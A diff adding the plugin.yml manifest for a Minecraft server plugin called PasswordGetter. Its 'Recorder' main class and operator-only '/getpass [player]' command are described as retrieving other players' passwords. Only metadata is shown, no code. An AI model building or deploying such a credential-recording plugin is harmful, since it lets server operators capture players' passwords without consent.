@@ -1,0 +1,11 @@
+name: PasswordGetter
+main: io.d0048.passwordGetter.Recorder
+version: 1.0
+description: A simple password getter
+author: HXB
+commands: 
+    getpass:
+        description: Get the password of a player
+        usage: /<command> [player]
+        permission: blockode.op
+        permission-message: 不用试了，你没权限0.0[Access Denied]
